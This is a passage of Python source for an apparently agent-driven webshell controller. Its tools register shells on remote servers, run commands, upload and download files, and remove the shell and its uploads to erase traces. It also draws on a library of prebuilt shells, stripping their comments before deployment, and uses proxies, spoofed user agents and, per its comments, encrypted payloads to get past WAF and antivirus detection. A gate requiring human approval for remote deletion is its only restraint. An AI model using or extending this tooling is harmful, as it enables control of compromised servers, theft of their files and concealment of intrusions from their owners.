        raise ToolError("远端返回的是拦截页/非命令回显（HTTP 200）: %s" % brief(text2, 200))
    out = _clean_plain(text2, allow_b64=True)
    if SHELL_ERR_RE.search(out or ""):
        raise ToolError("无法识别该 webshell 的载荷模式（eval 试探与 base64 试探都失败）；"
                        "eval 响应: %s；base64 响应: %s"
                        % (brief(probe_text or "", 120), brief(text2, 120)))
    _set_mode(name, "raw")
    return out


def _exec_cmd(name, sess, cmd, timeout):
    """统一执行入口：按 type 分发到 eval 型 / 命令型。"""
    typ = sess.get("type")
    if typ in ("php", "php_raw"):
        return _exec_php(name, sess, cmd, timeout)
    # jsp / aspx：命令原样交给远端 Runtime.exec / Process.Start
    _, text = _post_payload(sess, cmd, timeout, name)
    if _looks_blocked(text):
        raise ToolError("远端返回的是拦截页/非命令回显（HTTP 200）: %s" % brief(text, 200))
    return _clean_plain(text, allow_b64=False)


def _run_php_code(name, sess, code, timeout):
    """在 eval 型会话里直接跑一段 PHP 代码，返回其输出文本。"""
    if _mode_of(name) == "raw":
        raise ModeMismatch("该会话已判定为「系统执行型」马，无法直接执行 PHP 代码")
    _, text = _post_payload(sess, _php_code_payload(code, sess), timeout, name)
    inner = _extract_marked(text, sess)
    if inner is None:
        if _looks_blocked(text):
            raise ToolError("远端返回的是拦截页/非命令回显: %s" % brief(text, 200))
        msg = "远端未回标记（疑似不是 PHP eval 型马）: %s" % brief(text, 200)
        if sess.get("type") == "php":
            raise ModeMismatch(msg)
        raise ToolError(msg)
    _set_mode(name, "eval")
    return inner


def _read_remote_size(name, sess, remote_path, timeout):
    """命令型会话：远端正向 `wc -c < path` 取文件大小。"""
    out = _exec_cmd(name, sess, "wc -c < %s" % _shq(remote_path), timeout)
    m = re.search(r"(\d+)", out or "")
    if not m:
        raise ToolError("取远端文件大小失败: %s" % brief(out, 160))
    return int(m.group(1))


# ---------------------------------------------------------------------------
# 工具一：shell_add
# ---------------------------------------------------------------------------

def tool_shell_add(args):
    name = req_str(args, "name", "会话名")
    if not NAME_RE.match(name):
        raise ToolError("会话名非法（1-64 字符，不能含控制字符或路径分隔符）: %r" % name)
    url = req_str(args, "url", "WebShell URL")
    if not URL_RE.match(url):
        raise ToolError("url 必须以 http:// 或 https:// 开头: %s" % url)
    typ = req_str(args, "type", "php|php_raw|jsp|aspx").lower()
    if typ not in VALID_TYPES:
        raise ToolError("type 只支持 %s，收到: %s" % ("/".join(VALID_TYPES), typ))

    param = opt_str(args, "password", "pass") or "pass"
    if not re.match(r"^[A-Za-z_][A-Za-z0-9_\-\[\]]{0,63}$", param):
        raise ToolError("password 应是参数名（如 pass / cmd / z0），收到: %r" % param)

    method = (opt_str(args, "method", "POST") or "POST").upper()
    if method not in ("GET", "POST"):
        raise ToolError("method 只支持 GET / POST，收到: %s" % method)

    # header：JSON 字符串（也可以是对象），键值都必须是字符串
    header = {}
    raw_header = args.get("header")
    if isinstance(raw_header, dict):
        header = raw_header
    elif isinstance(raw_header, str) and raw_header.strip():
        try:
            header = json.loads(raw_header)
        except json.JSONDecodeError as e:
            raise ToolError("header 不是合法 JSON 对象: %s" % e)
        if not isinstance(header, dict):
            raise ToolError("header 必须是 JSON 对象，例如 {\"X-Token\":\"abc\"}")
    elif raw_header not in (None, ""):
        raise ToolError("header 必须是 JSON 字符串或对象")
    clean_header = {}
    for k, v in header.items():
        k = str(k).strip()
        if not k:
            raise ToolError("header 里存在空键名")
        if k.lower() in ("content-length", "host", "connection"):
            raise ToolError("header 不允许覆盖 %s（由客户端管理）" % k)
        clean_header[k] = str(v)

    note = opt_str(args, "note", "")
    # 出口隔离：会话级代理（可给一串做池）与 UA 覆盖
    proxy = (opt_str(args, "proxy", "") or "").strip()
    validate_proxy(proxy)
    user_agent = (opt_str(args, "user_agent", "") or "").strip()
    if len(user_agent) > 512:
        raise ToolError("user_agent 太长（上限 512 字符）")
    proxy_rotate = bool(args.get("proxy_rotate") or False)
    remote_path = (opt_str(args, "remote_path", "") or "").strip()
    if remote_path and not re.match(r"^(/|[A-Za-z]:[\\/])", remote_path):
        raise ToolError("remote_path 应是绝对路径，如 /var/www/html/s.php 或 C:\\inetpub\\s.aspx，"
                        "收到: %r" % remote_path)
    now = time.strftime("%Y-%m-%d %H:%M:%S")

    with _store_lock:
        store = _load_store()
        existed = name in store
        prev = store.get(name) or {}
        created = prev.get("created_at") or now
        store[name] = {
            "url": url,
            "type": typ,
            "password": param,
            "method": method,
            "header": clean_header,
            "note": note,
            # 落地绝对路径：shell_del 清痕迹时要靠它（PHP eval 型可由 __FILE__ 自报，命令型必须靠它）
            "remote_path": remote_path or (prev.get("remote_path") or ""),
            # 经 shell_upload 写过的远端文件，清痕迹时一并删除
            "artifacts": prev.get("artifacts") or [],
            # 出口代理与 UA：空着就沿用旧配置（改个备注不该把出口清掉）
            "proxy": proxy or (prev.get("proxy") or ""),
            "user_agent": user_agent or (prev.get("user_agent") or ""),
            # 默认不轮换：同一会话固定一个出口，换 IP 反而更显眼
            "proxy_rotate": proxy_rotate if "proxy_rotate" in args else bool(prev.get("proxy_rotate")),
            "created_at": created,
        }
        if existed:
            store[name]["updated_at"] = now
        _save_store(store)

    # 会话被覆盖时清掉旧的载荷模式缓存
    with _cache_lock:
        _MODE_CACHE.pop(name, None)

    log("shell_add %s type=%s method=%s header数=%d overwrite=%s"
        % (name, typ, method, len(clean_header), existed))

    lines = [
        "%s会话: %s" % ("已覆盖" if existed else "已登记", name),
        "  类型: %s" % typ,
        "  URL: %s" % _redact_url(url),
        "  方法: %s   参数名: %s" % (method, param),
        "  落地路径: %s" % (remote_path or "未记录（命令型马清痕迹时删不掉，建议现在补填 remote_path）"),
        "  出口: %s" % egress_label(store.get(name) or {}),
        "  UA: %s" % ((user_agent or (prev.get("user_agent") or "")) or (USER_AGENT[:48] + "…（默认浏览器 UA）")),
        "  自定义头: %s" % ("%d 个（%s）" % (len(clean_header), ", ".join(clean_header))
                            if clean_header else "无"),
        "  备注: %s" % (note or "—"),
        "  存储: %s（权限 600）" % STORE_PATH,
    ]
    if existed:
        lines.append("  提示: 该会话名已存在，已用新配置覆盖（created_at 保留）")
    lines.append("  下一步: shell_exec 验证连通性（如 cmd=\"id\"）")
    return ("\n".join(lines)), False


# ---------------------------------------------------------------------------
# 工具二：shell_list
# ---------------------------------------------------------------------------

def tool_shell_list(args):
    with _store_lock:
        store = _load_store()
    if not store:
        return ("暂无已登记的 WebShell 会话（用 shell_add 登记）"), False

    rows = []
    for name in sorted(store):
        s = store.get(name) or {}
        arts = s.get("artifacts") or []
        rows.append("- %s | %s | %s | %s | 落地: %s | 出口: %s | 上传残留: %d 个 | 备注: %s | 创建: %s" % (
            name,
            s.get("type") or "?",
            _redact_url(s.get("url") or ""),
            (s.get("method") or "POST"),
            (s.get("remote_path") or "未记录"),
            egress_label(s),
            len(arts) if isinstance(arts, list) else 0,
            (s.get("note") or "—"),
            (s.get("created_at") or "—"),
        ))
    # 注意：这里绝不输出 password（参数名）与 header（可能含凭证）
    text = "共 %d 个会话（名称 | 类型 | URL | 方法 | 落地路径 | 上传残留 | 备注 | 创建时间）\n%s" % (
        len(store), "\n".join(rows))
    text += ("\n（安全约定：不展示参数名与自定义 header；执行用 shell_exec，"
             "上传 shell_upload，下载 shell_download，清远端痕迹要 shell_del 显式传 remove_remote=true）")
    return text, False


# ---------------------------------------------------------------------------
# 工具三：shell_exec
# ---------------------------------------------------------------------------

def tool_shell_exec(args):
    name = req_str(args, "name", "会话名")
    cmd = req_str(args, "cmd", "要执行的命令 / 代码")
    timeout = as_int(args.get("timeout"), 30, 1, 600)
    sess = _get_session(name)

    t0 = time.time()
    out = _exec_cmd(name, sess, cmd, timeout)
    dt = time.time() - t0

    if out is None:
        out = ""
    truncated = False
    if len(out) > EXEC_OUTPUT_LIMIT:
        out = out[:EXEC_OUTPUT_LIMIT]
        truncated = True

    log("shell_exec %s type=%s %.1fs 输出 %d 字节 截断=%s"
        % (name, sess.get("type"), dt, len(out), truncated))

    if out == "":
        out = "（命令已执行，远端无输出）"
    elif truncated:
        out += "\n…(输出超过 %dKB，已截断)" % (EXEC_OUTPUT_LIMIT // 1024)
    return out, False


# ---------------------------------------------------------------------------
# 工具四：shell_upload（分块追加写入，每块 ≤512KB）
# ---------------------------------------------------------------------------

def _upload_php_chunk(name, sess, remote_path, data, append, timeout):
    """走 PHP file_put_contents 写一块，返回实际写入字节数。"""
    out = _run_php_code(name, sess, _php_write_code(remote_path, data, append), timeout)
    t = (out or "").strip()
    m = re.match(r"OK:(\d+)$", t)
    if not m:
        raise ToolError("远端写入分块失败: %s" % brief(t, 200))
    return int(m.group(1))


def _upload_shell_chunk(name, sess, remote_path, data, append, timeout):
    """命令型会话：printf + base64 -d 追加（aspx 走 PowerShell）。"""
    b = b64e(data)
    if sess.get("type") == "aspx":
        _exec_cmd(name, sess, _ps_write_cmd(remote_path, b, append), timeout)
        return len(data)
    cmd = "printf '%s' " + _shq(b) + " | base64 -d " + (">> " if append else "> ") + _shq(remote_path)
    _exec_cmd(name, sess, cmd, timeout)
    return len(data)


def tool_shell_upload(args):
    name = req_str(args, "name", "会话名")
    remote_path = req_str(args, "remote_path", "远端路径")
    timeout = as_int(args.get("timeout"), 30, 1, 600)
    chunk = as_int(args.get("chunk_size"), CHUNK_DEFAULT, 4096, CHUNK_MAX)

    has_b64 = args.get("b64") not in (None, "")
    has_text = args.get("content") not in (None, "")
    if has_b64 == has_text:
        raise ToolError("content 与 b64 必须二选一（文本内容 / base64 内容），不能同时给或都不给")
    if has_b64:
        raw_b64 = args.get("b64")
        if not isinstance(raw_b64, str):
            raise ToolError("b64 必须是字符串")
        try:
            data = b64d(raw_b64)
        except Exception as e:
            raise ToolError("b64 解码失败（%s）: %s" % (type(e).__name__, brief(raw_b64, 80)))
    else:
        content = args.get("content")
        if not isinstance(content, str):
            raise ToolError("content 必须是字符串（二进制内容请用 b64）")
        data = content.encode("utf-8")

    if len(data) > UPLOAD_MAX:
        raise ToolError("内容过大（%d 字节），单次上传上限 %d 字节" % (len(data), UPLOAD_MAX))

    sess = _get_session(name)
    total = len(data)
    parts = max(1, (total + chunk - 1) // chunk)
    log("shell_upload %s 目标=%s 共 %d 字节 分 %d 块 chunk=%d"
        % (name, remote_path, total, parts, chunk))

    written = 0
    use_php = sess.get("type") in ("php", "php_raw") and _mode_of(name) != "raw"
    t0 = time.time()
    if use_php:
        try:
            for i in range(parts):
                part = data[i * chunk:(i + 1) * chunk]
                n = _upload_php_chunk(name, sess, remote_path, part, i > 0, timeout)
                if n != len(part):
                    raise ToolError("第 %d 块写入长度不符（期望 %d，实得 %d）"
                                    % (i + 1, len(part), n))
                written += n
        except ModeMismatch as e:
            # 远端不是 eval 型：降级到命令型上传，从头重写一遍，并记住模式
            log("shell_upload %s PHP 写文件不可用，降级为 shell 上传: %s" % (name, e))
            _set_mode(name, "raw")
            use_php = False
            written = 0

    if not use_php:
        for i in range(parts):
            part = data[i * chunk:(i + 1) * chunk]
            _upload_shell_chunk(name, sess, remote_path, part, i > 0, timeout)
            written += len(part)

    dt = time.time() - t0

    # 校验：命令型会话用 wc -c 复核总字节；PHP 侧每块已有写入数校验
    verify = ""
    if not use_php and sess.get("type") != "aspx":
        try:
            remote_size = _read_remote_size(name, sess, remote_path, timeout)
            if remote_size != total:
                raise ToolError("上传校验失败：期望 %d 字节，远端实际 %d 字节"
                                % (total, remote_size))
            verify = "，wc -c 校验一致（%d 字节）" % remote_size
        except ToolError:
            raise
        except Exception as e:
            verify = "，但无法复核大小（%s）" % e

    if written != total:
        raise ToolError("上传不完整：期望 %d 字节，实际写入 %d 字节" % (total, written))

    # 记入会话的上传残留清单：shell_del 显式清远端时按这份清单删文件
    try:
        _remember_artifact(name, remote_path)
    except Exception as e:
        log("shell_upload %s 记录残留路径失败（不影响上传）: %s" % (name, e))

    return ("上传完成: %s\n  远端路径: %s\n  字节数: %d\n  分块: %d 块（每块 ≤%d 字节，追加写入）"
            "\n  方式: %s\n  耗时: %.1fs%s\n  已记入上传残留清单（要清痕迹时 shell_del 传 remove_remote=true 才会删）"
            % (name, remote_path, total, parts, chunk,
               "PHP file_put_contents" if use_php else "shell/PowerShell 命令", dt, verify)), False


# ---------------------------------------------------------------------------
# 工具五：shell_download
# ---------------------------------------------------------------------------

def _parse_ok_read(text):
    """解析 'OK|原始大小|base64'，返回 (size, bytes)。"""
    t = (text or "").strip()
    m = re.match(r"OK\|(\d+)\|", t)
    if not m:
        raise ToolError("远端读取失败: %s" % brief(t, 200))
    size = int(m.group(1))
    try:
        data = b64d(t[m.end():])
    except Exception as e:
        raise ToolError("远端内容 base64 解码失败（%s）: %s" % (type(e).__name__, brief(t, 160)))
    return size, data


def tool_shell_download(args):
    name = req_str(args, "name", "会话名")
    remote_path = req_str(args, "remote_path", "远端路径")
    max_bytes = as_int(args.get("max_bytes"), DOWNLOAD_DEFAULT, 1, DOWNLOAD_MAX)
    timeout = as_int(args.get("timeout"), 30, 1, 600)
    want = (opt_str(args, "as", "auto") or "auto").lower()
    if want not in ("auto", "text", "b64"):
        raise ToolError("as 只支持 auto / text / b64，收到: %s" % want)

    sess = _get_session(name)
    t0 = time.time()
    size = 0
    data = b""
    how = ""

    if sess.get("type") in ("php", "php_raw") and _mode_of(name) != "raw":
        try:
            out = _run_php_code(name, sess, _php_read_code(remote_path, max_bytes), timeout)
            size, data = _parse_ok_read(out)
            how = "PHP file_get_contents"
        except ModeMismatch as e:
            log("shell_download %s PHP 读文件不可用，降级为 shell: %s" % (name, e))
            _set_mode(name, "raw")
            data = b""
    if not data and not how:
        if sess.get("type") == "aspx":
            out = _exec_cmd(name, sess, _ps_read_cmd(remote_path, max_bytes), timeout)
            size, data = _parse_ok_read(out)
            how = "PowerShell"
        else:
            size = _read_remote_size(name, sess, remote_path, timeout)
            # head -c 先截断，再 base64（-w0 不一定可用，用 tr 去掉换行）
            cmd = "head -c %d %s | base64 | tr -d '\\n'" % (max_bytes, _shq(remote_path))
            out = _exec_cmd(name, sess, cmd, timeout)
            blob = re.sub(r"\s+", "", out or "")
            if not blob and size > 0:
                raise ToolError("远端没有回传内容（%s 字节）: %s" % (size, brief(out, 160)))
            try:
                data = b64d(blob) if blob else b""
            except Exception as e:
                raise ToolError("远端内容 base64 解码失败（%s）: %s"
                                % (type(e).__name__, brief(out, 160)))
            how = "shell(head|base64)"

    if len(data) > size and size > 0:
        data = data[:size]  # 偶发填充导致的尾巴，按原始大小对齐
    got = len(data)
    truncated = size > got
    dt = time.time() - t0
    log("shell_download %s 路径=%s 远端 %d 字节 返回 %d 字节 截断=%s %.1fs"
        % (name, remote_path, size, got, truncated, dt))

    if want == "auto":
        mode = "text" if _is_text(data) else "b64"
    else:
        mode = want

    head = ("文件: %s\n  会话: %s\n  远端大小: %d 字节   返回: %d 字节   %s\n  方式: %s   耗时: %.1fs"
            % (remote_path, name, size, got,
               ("已截断（max_bytes=%d）" % max_bytes) if truncated else "未截断", how, dt))

    if mode == "text":
        for enc in ("utf-8", "gb18030"):
            try:
                body = data.decode(enc)
                break
            except (UnicodeDecodeError, LookupError):
                body = None
        if body is None:
            body = data.decode("utf-8", "replace")
        return (head + "\n----- 文本内容开始 -----\n" + body + "\n----- 文本内容结束 -----"), False

    return (head + "\n----- base64 内容开始（单行，可直接解码） -----\n"
            + b64e(data) + "\n----- base64 内容结束 -----"), False


# ---------------------------------------------------------------------------
# 工具六：shell_del（默认只摘登记；显式 remove_remote=true 才动远端）
# ---------------------------------------------------------------------------

DEL_STATUS_CN = {
    "OK": "已删除",
    "GONE": "原本就不存在",
    "FAIL": "删除失败（权限/只读挂载/SELinux 等）",
}


# 定位马自身的真实绝对路径。不能用 __FILE__：马是 eval 执行的，__FILE__ 会变成
# "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
# SCRIPT_FILENAME / get_included_files()[0] 拿到的才是入口脚本的真实路径。
def _php_self_path_code(n):
    """拼「取马自身真实路径」的 PHP 片段。

    不能用 __FILE__：马是 eval 执行的，__FILE__ 是
    "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
    SCRIPT_FILENAME / get_included_files()[0] 才是入口脚本的真实路径。
    """
    s_, g_ = n["self"], n["inc"]
    return ("%s='';"
            "if(!empty($_SERVER['SCRIPT_FILENAME'])){%s=$_SERVER['SCRIPT_FILENAME'];}"
            "if(%s===''){%s=@get_included_files();"
            "if(!empty(%s)){%s=%s[0];}}"
            "if(%s===''){%s=__FILE__;}"
            "%s=(@realpath(%s) ?: %s);"
            % (s_, s_, s_, g_, g_, s_, g_, s_, s_, s_, s_, s_))


def _php_del_code(paths, include_self=False):
    """拼 PHP 删除代码：逐个 unlink 并回报 OK / GONE / FAIL。

    马自身用 SCRIPT_FILENAME 定位（见 _php_self_path_code），不接收外部传入的自身
    路径，避免误删同站的正常文件。
    """
    n = _php_names()
    items = ",".join("base64_decode('%s')" % b64e(p.encode("utf-8")) for p in (paths or []) if p)
    parts = ["%s=[%s];" % (n["list"], items)]
    if include_self:
        parts.append(_php_self_path_code(n))
        parts.append("%s[]=%s;" % (n["list"], n["self"]))
    parts.append(
        "%s=[];" % n["res"] +
        "foreach(%s as %s){" % (n["list"], n["path"]) +
        "if(!file_exists(%s)){%s[]='GONE '.%s;continue;}" % (n["path"], n["res"], n["path"]) +
        "%s[]=(@unlink(%s)?'OK ':'FAIL ').%s;" % (n["res"], n["path"], n["path"]) +
        "}" +
        'echo implode("\\n",%s);' % n["res"]
    )
    return "".join(parts)


def _parse_del_out(text):
    """解析删除回显，返回 [(状态, 路径)]。"""
    res = []
    for line in (text or "").replace("\r", "").split("\n"):
        line = line.strip()
        if not line:
            continue
        m = re.match(r"^(OK|GONE|FAIL)\s+(.+)$", line)
        if m:
            res.append((m.group(1), m.group(2).strip()))
    return res


def _sh_del_cmd(paths, typ):
    """命令型马清理：删完就地判断是否存在，回 OK / FAIL。"""
    if typ == "aspx":
        seg = []
        for p in paths:
            q = p.replace('"', '""')
            seg.append('del /f /q "%s" >nul 2>nul & if exist "%s" (echo FAIL %s) else (echo OK %s)'
                       % (q, q, p, p))
        return " & ".join(seg)
    seg = []
    for p in paths:
        seg.append("rm -f %s; if [ -e %s ]; then echo 'FAIL %s'; else echo 'OK %s'; fi"
                   % (_shq(p), _shq(p), p, p))
    return "; ".join(seg)


def _confirm_self_gone(name, sess, timeout):
    """删完再打一枪：用一个必然回显的代码载荷试探，取不到标记才算真没了。

    不能拿「空响应」当判据——加密马收到不认识的载荷本来就是空响应。
    返回 (是否已删, 说明)。
    """
    probe = _php_code_payload("echo 'ok';", sess)
    try:
        _, text = _post_payload(sess, probe, timeout, name)
    except ToolError as e:
        return True, "复查请求已失败（%s）" % brief(str(e), 120)
    alive = _extract_marked(text, sess) is not None
    if alive:
        return False, "复查仍能打通马并获得回显，文件没删掉"
    if _looks_blocked(text):
        return True, "复查返回拦截页，已无马的回显"
    return True, "复查响应里已无马的回显"


def _purge_remote(name, sess, timeout, explicit_path=""):
    """删远端落地物（马文件 + shell_upload 残留）。

    返回 (报告行列表, 马文件是否确认已删 / None 表示无法判定, 马的绝对路径)。
    """
    typ = (sess.get("type") or "").strip()
    artifacts = [p for p in (sess.get("artifacts") or [])
                 if isinstance(p, str) and p.strip()]
    hint = (explicit_path or sess.get("remote_path") or "").strip()
    lines = []
    self_gone = None
    self_path = hint

    if typ in ("php", "php_raw") and _mode_of(name) != "raw":
        # eval 型：用 __FILE__ 自删，顺带把上传残留删掉，一次请求搞定
        try:
            out = _run_php_code(name, sess, _php_del_code(artifacts, True), timeout)
        except ModeMismatch:
            raise ToolError("该会话已判定为命令执行型马，无法用 PHP unlink 自删；"
                            "请 shell_add 时填 remote_path 或 shell_del 传 path，改用系统命令删除")
        res = _parse_del_out(out)
        if not res:
            raise ToolError("远端 unlink 没回明确结果: %s" % brief(out, 200))
        for i, (status, path) in enumerate(res):
            is_self = (i == len(res) - 1)
            lines.append("  %s %s（%s）" % ("马文件" if is_self else "上传残留",
                                            path, DEL_STATUS_CN.get(status, status)))
            if is_self:
                self_path = path
                self_gone = status in ("OK", "GONE")
    else:
        if not hint:
            raise ToolError("命令型会话（%s）必须知道马的绝对路径才能真正删掉："
                            "请 shell_add 时填 remote_path，或 shell_del 传 path=/绝对/路径.php。"
                            "只删登记请传 remove_remote=false" % typ)
        targets = [hint] + [p for p in artifacts if p != hint]
        out = _exec_cmd(name, sess, _sh_del_cmd(targets, typ), timeout)
        res = _parse_del_out(out)
        if not res:
            raise ToolError("远端删除命令没回明确结果: %s" % brief(out, 200))
        for status, path in res:
            is_self = (path == hint)
            lines.append("  %s %s（%s）" % ("马文件" if is_self else "上传残留",
                                            path, DEL_STATUS_CN.get(status, status)))
            if is_self:
                self_gone = status in ("OK", "GONE")

    # 落地物删完统一复查一次：马还在不在
    if self_gone:
        gone, detail = _confirm_self_gone(name, sess, timeout)
        if not gone:
            self_gone = False
            lines.append("  复查: %s" % detail)
        else:
            lines.append("  复查: %s" % detail)
    elif self_gone is False:
        lines.append("  复查: 未通过——远端文件仍在，痕迹未清理干净")

    return lines, self_gone, self_path


def tool_shell_del(args):
    name = req_str(args, "name", "会话名")
    timeout = as_int(args.get("timeout"), 30, 1, 600)
    # 默认只摘登记，不动远端：要不要清痕迹由人决定，工具不替人做主
    remove_remote = bool(args.get("remove_remote") or False)
    force = bool(args.get("force") or False)
    explicit = (opt_str(args, "path", "") or "").strip()
    # 人工授权闸：光传 remove_remote=true 不够，还要 human_approved=true。
    # agent 常按旧计划正文（"验证后删马并核验 404"）自删远端，把口子堵在这里，
    # 删不删远端就真的由人说了算。
    human_approved = bool(args.get("human_approved") or False)
    if remove_remote and ALLOW_REMOTE_DELETE and not human_approved:
        raise ToolError(
            "远端删除需要人工授权，已拒绝执行（远端文件未动，本机登记也保留）。\n"
            "删不删目标上的文件由人决定，agent 不能自己清场。\n"
            "如确实要清远端：人工在 WebShell 功能页删，或由操作人明确授权后\n"
            "传 remove_remote=true 且 human_approved=true。\n"
            "只想摘掉本机登记、不动目标：去掉 remove_remote 即可。"
        )

    with _store_lock:
        store = _load_store()
        if name not in store:
            raise ToolError("会话不存在: %s（用 shell_list 查看）" % name)
        sess = dict(store[name] or {})

    report = []
    self_gone = None
    self_path = explicit or (sess.get("remote_path") or "")

    if not remove_remote:
        report.append("  远端: 未动（remove_remote 未开启，马文件与上传残留都还在目标上）")
    else:
        try:
            lines, self_gone, self_path = _purge_remote(name, sess, timeout, explicit)
            report.extend(lines)
        except ToolError as e:
            self_gone = False
            report.append("  远端清理失败: %s" % e)

    # 远端没清干净就不摘登记：活着的马不能静默失联（确要丢弃用 force=true）
    if remove_remote and self_gone is False and not force:
        with _cache_lock:
            _MODE_CACHE.pop(name, None)
        raise ToolError(
            "远端还没删干净，会话登记已保留（用 shell_list 可复查）:\n%s\n"
            "处理建议: ① shell_exec 手动确认路径后用 shell_exec 删（如 cmd=\"rm -f /path\"）；"
            "② 若该会话本来就只想丢弃登记（马留给后续人工清理），传 force=true。"
            % "\n".join(report))

    with _store_lock:
        store = _load_store()
        removed = store.pop(name, None)
        _save_store(store)
        remain = len(store)
    with _cache_lock:
        _MODE_CACHE.pop(name, None)

    log("shell_del %s type=%s remove_remote=%s gone=%s 剩余 %d 个会话"
        % (name, (removed or {}).get("type"), remove_remote, self_gone, remain))

    head = ["已删除会话: %s（类型 %s）" % (name, (removed or {}).get("type") or "?")]
    head.extend(report)
    head.append("  本机登记: 已从 %s 移除，剩余 %d 个会话" % (STORE_PATH, remain))
    if remove_remote:
        head.append("  痕迹说明: 远端马文件与 shell_upload 残留已按上述结果处理；"
                    "本机 shell 历史里的命令记录不会自动删，需要的话自己清理。")
    else:
        head.append("  痕迹说明: 只注销了本机登记，远端马仍可用；需要清痕迹时显式传 remove_remote=true。")
    return ("\n".join(head)), False


# ---------------------------------------------------------------------------
# 内置 payload 库（/opt/artex/payloads/webshell，预先写好的马，直接取用）
# ---------------------------------------------------------------------------

def _payload_root():
    return os.path.realpath(PAYLOAD_DIR)


def _fmt_bytes(n):
    if n < 1024:
        return "%dB" % n
    if n < 1024 * 1024:
        return "%.1fKB" % (n / 1024.0)
    return "%.1fMB" % (n / (1024.0 * 1024))


def _payload_meta(text):
    """从文件头注释抠 @ 元信息；同一标签只取第一次出现的值。"""
    meta = {}
    for line in (text or "").splitlines()[:80]:
        for m in PAYLOAD_META_RE.finditer(line):
            k = m.group(1)
            v = m.group(2).strip()
            for tail in ("*/", "--%>", "-->"):
                if v.endswith(tail):
                    v = v[:-len(tail)].strip()
            if k not in meta and v:
                meta[k] = v
    return meta


def _strip_payload_meta(text):
    """去掉载荷文件头的说明注释（@summary 那一整块）。

    这块说明只在本机库里对人有意义。跟着载荷落到目标上，等于把「这是什么马、
    参数怎么用、绕的是哪类 WAF」写给别人看。所以取 payload 时剥掉它，
    而讲给 agent 的元信息仍走 _payload_meta（读的是库里的原文件）。
    """
    t = text or ""
    head = ""
    m = re.match(r"\A\s*(<\?(?:php|=)?)", t)
    if m:
        head = m.group(1)
        rest = t[m.end():]
    else:
        rest = t
    m2 = re.match(r"\A\s*/\*.*?\*/", rest, re.S)
    if not m2:
        return t
    rest = rest[m2.end():].lstrip("\r\n")
    return (head + "\n" + rest) if head else rest


def _read_payload_file(path):
    """读 payload 全文（UTF-8 文本，读不到就抛 ToolError，不静默返回空）。"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except OSError as e:
        raise ToolError("读取 payload 失败（%s）: %s" % (path, e))
    except UnicodeDecodeError as e:
        raise ToolError("payload 不是合法 UTF-8 文本（%s）: %s" % (path, e))


def _payload_entries(type_filter=None):
    """枚举 payload 库条目；目录缺失直接报错，不返回假数据。"""
    root = _payload_root()
    if not os.path.isdir(root):
        raise ToolError("payload 目录不存在: %s" % root)
    out = []
    for typ in PAYLOAD_TYPES:
        if type_filter and typ != type_filter:
            continue
        d = os.path.join(root, typ)
        if not os.path.isdir(d):
            continue
        for fn in sorted(os.listdir(d)):
            if not fn.lower().endswith("." + typ):
                continue
            p = os.path.join(d, fn)
            if not os.path.isfile(p):
                continue
            text = _read_payload_file(p)
            out.append({
                "name": typ + "/" + fn,
                "type": typ,
                "path": p,
                "size": len(text.encode("utf-8")),
                "meta": _payload_meta(text),
            })
    return out


def _resolve_payload_name(name):
    """校验 payload 名称并解析成真实路径；任何越界尝试一律拒绝。"""
    if not isinstance(name, str) or not name.strip():
        raise ToolError("缺少必填参数 name（形如 php/eval.php，可先用 payload_list 查看）")
    raw = name.strip()
    if "\x00" in raw or "\\" in raw:
        raise ToolError("name 含非法字符（禁止反斜杠与 NUL）: %r" % raw)
    if raw.startswith("/") or raw.startswith("~"):
        raise ToolError("name 不允许绝对路径（只能用库内相对路径）: %s" % raw)
    parts = [p for p in raw.split("/") if p != ""]
    if ".." in parts or "." in parts:
        raise ToolError("name 不允许包含 . 或 ..（禁止路径穿越）: %s" % raw)
    if len(parts) != 2:
        raise ToolError("name 必须形如 <类型>/<文件名>，例如 php/eval.php: %s" % raw)
    typ, fn = parts
    if typ not in PAYLOAD_TYPES:
        raise ToolError("类型只支持 %s，收到: %s" % ("/".join(PAYLOAD_TYPES), typ))
    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]*", fn):
        raise ToolError("文件名非法（只允许字母数字与 . _ -）: %s" % fn)
    if not fn.lower().endswith("." + typ):
        raise ToolError("%s 必须是 .%s 后缀（文件名与类型目录要对上）" % (fn, typ))
    root = _payload_root()
    path = os.path.realpath(os.path.join(root, typ, fn))
    # 双保险：即便目录里有符号链接，落点也必须仍在库目录内
    if not (path == root or path.startswith(root + os.sep)):
        raise ToolError("拒绝越界访问: %s" % raw)
    if not os.path.isfile(path):
        raise ToolError("payload 不存在: %s（用 payload_list 查看可用条目）" % raw)
    return typ + "/" + fn, path


def tool_payload_list(args):
    typ = (opt_str(args, "type", "") or "").lower()
    if typ and typ not in PAYLOAD_TYPES:
        raise ToolError("type 只支持 %s，收到: %s" % ("/".join(PAYLOAD_TYPES), typ))
    entries = _payload_entries(typ or None)
    if not entries:
        return ("payload 库为空（目录 %s）" % PAYLOAD_DIR), False

    lines = ["内置 payload 共 %d 个（目录 %s）" % (len(entries), PAYLOAD_DIR)]
    cur = None
    for e in entries:
        m = e["meta"]
        if e["type"] != cur:
            cur = e["type"]
            cnt = sum(1 for x in entries if x["type"] == cur)
            lines.append("")
            lines.append("[%s] %d 个" % (cur, cnt))
        lines.append("- %s | %s | %s | %s"
                     % (e["name"], e["type"], _fmt_bytes(e["size"]),
                        m.get("summary") or "（无说明）"))
        scene = m.get("scene") or "—"
        extra = []
        if m.get("param"):
            extra.append("参数: %s" % m["param"])
        if m.get("mcp"):
            extra.append("配套: %s" % m["mcp"])
        lines.append("    适用场景: %s" % scene)
        if extra:
            lines.append("    " + "   ".join(extra))
    lines.append("")
    lines.append("用 payload_get(name) 取全文落地，例如 payload_get(\"php/eval.php\")")
    return ("\n".join(lines)), False


# ---- 加密载荷：取用时才生成正文与随机参数名 ----
#
# 库里带 __ARTEX_L__ 占位的 payload 是加密马：磁盘上只有一段 base64 密文，明文逻辑
# 和参数名都留到取用那一刻再拼。明文一句话马的 eval($_POST['pass']) / system(...)
# 是 WAF、AV 的固定特征；参数名再固定成 pass / cmd / shell，等于把入口写在旁边。
#
# 这段 inner 与 server/webshell.go 的 webshellEncInner 必须逐字一致：两边下发同一匹马。
ENC_KEY_TOKEN = "__ARTEX_K__"
ENC_BLOB_TOKEN = "__ARTEX_L__"
ENC_INNER = (
    "$s=isset($_POST[$K])?$_POST[$K]:(isset($_GET[$K])?$_GET[$K]:'');"
